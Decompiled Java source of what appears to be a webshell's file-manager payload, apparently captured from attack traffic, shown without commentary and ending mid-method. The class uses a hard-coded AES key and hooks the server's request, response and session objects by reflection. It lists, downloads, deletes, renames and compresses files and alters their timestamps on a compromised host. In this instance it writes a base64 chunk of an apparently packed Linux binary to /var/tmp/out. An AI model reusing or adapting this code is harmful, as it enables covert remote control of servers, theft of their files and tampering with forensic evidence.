package net.mckl;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: FileOperation.java */
/* JADX INFO: loaded from: 359_frame_412223.class */
public class Igeo {
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String hash;
    public static String blockIndex;
    public static String blockSize;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset;

    private byte[] Encrypt(byte[] bArr) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] bArrDoFinal = cipher.doFinal(bArr);
        try {
            Class<?> cls = Class.forName("java.util.Base64");
            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
        } catch (Throwable th) {
            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
        }
        return bArrDoFinal;
    }

    public Igeo() {
        mode = "";
        mode += "update";
        path = "";
        path += "/var/tmp/out";
        blockIndex = "";
        blockIndex += "351";
        blockSize = "";
        blockSize += "30720";
        content = "";
        content += "cmFwaHkuaGF6bWF0LmJpbmRpbmdzLm9wZW5zc2wuX2NvbmRpdGlvbmFsKQNyAgAAAGnsDAQAaQoKAAApAvosY3J5cHRvZ3JhcGh5Lmhhem1hdC5iaW5kaW5ncy5vcGVuc3NsLmJpbmRpbmcpA3ICAAAAafYWBABp+wkAACkC+h5jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMpA3IVAAAAafEgBADpXgAAACkC+ipjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuX2FzeW1tZXRyaWMpA3ICAAAAaU8hBABpawEAACkC+i9jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuX2NpcGhlcmFsZ29yaXRobSkDcgIAAABpuiIEAGmSAgAAKQL6LWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5fc2VyaWFsaXphdGlvbikDcgIAAABpTCUEAGmVAwAAKQL6KWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljKQNyFQAAAGnhKAQAaVcCAAApAvosY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMuZGgpA3ICAAAAaTgrBABpGgoAACkC+i1jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5kc2EpA3ICAAAAaVI1BABp9AwAACkC+ixjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5lYykDcgIAAABpRkIEAGn2FQAAKQL6MWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLmVkMjU1MTkpA3ICAAAAaTxYBABpBgUAACkC+i9jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5lZDQ0OCkDcgIAAABpQl0EAGnhBAAAKQL6MWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLnBhZGRpbmcpA3ICAAAAaSNiBABpzQQAACkC+i1jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy5yc2EpA3ICAAAAafBmBABpORIAACkC+i9jcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuYXN5bW1ldHJpYy51dGlscykDcgIAAABpKXkEAGlRAwAAKQL6MGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLngyNTUxOSkDcgIAAABpenwEAGnABAAAKQL6LmNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLng0NDgpA3ICAAAAaTqBBABptAQAACkC+iZjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycykDchUAAABp7oUEAGkKAQAAKQL6K2NyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQpA3ICAAAAafiGBABpuggAACkC+jFjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5hbGdvcml0aG1zKQNyAgAAAGmyjwQAaYcGAAApAvorY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMuYmFzZSkDcgIAAABpOZYEAGkrDAAAKQL6LGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLm1vZGVzKQNyAgAAAGlkogQAafwJAAApAvosY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNvbnN0YW50X3RpbWUpA3ICAAAAaWCsBABpLAEAACkC+iVjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuaGFzaGVzKQNyAgAAAGmMrQQAaaoKAAApAvoiY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmtkZikDchUAAABpNrgEAGkZAgAAKQL6KWNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5rZGYuc2NyeXB0KQNyAgAAAGlPugQAab8EAAApAvosY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLnNlcmlhbGl6YXRpb24pA3IVAAAAaQ6/BABpoQEAACkC+jFjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuc2VyaWFsaXphdGlvbi5iYXNlKQNyAgAAAGmvwAQA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UEFDSEUAAAAAAABAAJTAvQAAAyAAAAX8AXhjcnlwdG9ncmFwaHktMy40LjguZGlzdC1pbmZvL0xJQ0VOU0UuQlNEAAAAAAAAAAAAQACUw90AAAS/AAAJbwF4Y3J5cHRvZ3JhcGh5LTMuNC44LmRpc3QtaW5mby9MSUNFTlNFLlBTRgAAAAAAAAAAAEAAlMicAAAGvQAAFDMBeGNyeXB0b2dyYXBoeS0zLjQuOC5kaXN0LWluZm8vTUVUQURBVEEAAAAAAAAAAAAAAABAAJTPWQAAEV0AACbqAXhjcnlwdG9ncmFwaHktMy40LjguZGlzdC1pbmZvL1JFQ09SRAAAAAAAAAAAAAAAAAAAQACU4LYAAAAIAAAAAAF4Y3J5cHRvZ3JhcGh5LTMuNC44LmRpc3QtaW5mby9SRVFVRVNURUQAAAAAAAAAAAAAAEAAlOC+AAAAdAAAAHABeGNyeXB0b2dyYXBoeS0zLjQuOC5kaXN0LWluZm8vV0hFRUwAAAAAAAAAAAAAAAAAAABAAJThMgAAACcAAAAfAXhjcnlwdG9ncmFwaHktMy40LjguZGlzdC1pbmZvL3RvcF9sZXZlbC50eHQAAAAAAAAAIACU4VkAD1OtAA9TrQB6UFlaLnB5egAAAAAAAABNRUkMCwoLDgCkOn4ApDUGAAAFIAAAATVsaWJweXRob24zLjkuc28uMS4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALm5vdGUuZ251LmJ1aWxkLWlkAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZGF0YS5yZWwucm8ALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AHB5ZGF0YQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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";
        this.osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap();
        try {
            try {
                fillContext(obj);
                if (mode.equalsIgnoreCase("list")) {
                    result.put("msg", list());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("show")) {
                    result.put("msg", show());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("checkExist")) {
                    result.put("msg", checkExist(path));
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("delete")) {
                    result = delete();
                } else if (mode.equalsIgnoreCase("create")) {
                    result.put("msg", create());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("append")) {
                    result.put("msg", append());
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("update")) {
                    updateFile();
                    result.put("msg", "ok");
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("downloadPart")) {
                    result.put("msg", downloadPart(path, Long.parseLong(blockIndex), Long.parseLong(blockSize)));
                    result.put("status", "success");
                } else {
                    if (mode.equalsIgnoreCase("download")) {
                        download();
                        try {
                            Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                            Method write = so.getClass().getMethod("write", byte[].class);
                            write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                            so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                            so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return true;
                    }
                    if (mode.equalsIgnoreCase("rename")) {
                        result = renameFile();
                    } else if (mode.equalsIgnoreCase("createFile")) {
                        result.put("msg", createFile());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("compress")) {
                        zipFile(path, true);
                        result.put("msg", "ok");
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("createDirectory")) {
                        result.put("msg", createDirectory());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                        result.put("msg", getTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                        result.put("msg", updateTimeStamp());
                        result.put("status", "success");
                    } else if (mode.equalsIgnoreCase("check")) {
                        result.put("msg", checkFileHash(path));
                        result.put("status", "success");
                    }
                }
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class);
                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                    return true;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return true;
                }
            } catch (Throwable e3) {
                e3.printStackTrace();
                result.put("msg", e3.getMessage());
                result.put("status", "fail");
                try {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write3 = so3.getClass().getMethod("write", byte[].class);
                    write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                    return true;
                } catch (Exception e4) {
                    e4.printStackTrace();
                    return true;
                }
            }
        } catch (Throwable th) {
            try {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write4 = so4.getClass().getMethod("write", byte[].class);
                write4.invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
            } catch (Exception e5) {
                e5.printStackTrace();
            }
            throw th;
        }
    }

    private String checkFileHash(String path2) throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch != null && ch.isOpen()) {
            ch.close();
        }
        byte[] input = getFileData(path2);
        if (input == null || input.length == 0) {
            return null;
        }
        MessageDigest md5 = MessageDigest.getInstance("MD5");
        md5.update(input);
        byte[] byteArray = md5.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            sb.append(String.format("%02x", Byte.valueOf(b)));
        }
        return sb.substring(0, 16);
    }

    private void updateFile() throws Exception {
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path);
        if (ch == null) {
            FileOutputStream fos = new FileOutputStream(path);
            ch = fos.getChannel();
            sessionSetAttribute(this.Session, "fos", fos);
            sessionSetAttribute(this.Session, path, ch);
        }
        synchronized (ch) {
            ch.position(Integer.parseInt(blockIndex) * Integer.parseInt(blockSize));
            ch.write(ByteBuffer.wrap(base64decode(content)));
        }
    }

    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        String version = System.getProperty("java.version");
        if (version.compareTo("1.7") >= 0) {
            return false;
        }
        return true;
    }

    private String checkExist(String path2) throws Exception {
        File file = new File(path2);
        if (file.exists()) {
            return file.length() + "";
        }
        throw new Exception("");
    }

    private String getFilePerm(File file) {
        String permStr = "";
        if (isWindows()) {
            try {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            } catch (Error e) {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/-";
            }
        } else {
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0) {
                try {
                    getClass();
                    Class<?> cls = Class.forName("java.nio.file.Files");
                    getClass();
                    Class<?> cls2 = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                    getClass();
                    Class<?> cls3 = Class.forName("java.nio.file.Paths");
                    getClass();
                    Class<?> cls4 = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                    Object f = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), file.getAbsolutePath(), new String[0]);
                    Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, f, cls2, new LinkOption[0]);
                    Object result = cls4.getMethod("toString", Set.class).invoke(cls4, cls2.getMethod("permissions", new Class[0]).invoke(attrs, new Object[0]));
                    permStr = result.toString();
                } catch (Exception e2) {
                }
            } else {
                permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
            }
        }
        return permStr;
    }

    private String list() throws Exception {
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
